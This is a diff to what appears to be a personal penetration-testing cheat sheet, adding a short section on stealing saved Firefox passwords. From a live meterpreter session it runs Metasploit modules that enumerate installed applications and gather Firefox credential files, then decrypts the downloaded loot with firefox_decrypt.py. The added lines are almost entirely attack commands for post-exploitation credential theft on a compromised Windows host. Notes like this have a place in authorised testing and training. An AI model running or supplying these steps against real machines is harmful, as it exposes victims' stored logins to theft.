@@ -589,6 +589,22 @@ LPORT 9999
 run -j
 ```
 
+## firefox decrypt
+
+check firefox is installed download creds from meterpreter session
+```
+run post/windows/gather/enum_applications
+run post/multi/gather/firefox_creds
+```
+rename the files to actual file names
+
+run firefox decrypt
+```
+/home/kali/Documents/firefox_decrypt/firefox_decrypt.py /home/kali/Downloads/loot/
+```
+
+
+
 ## CheckList
 
 
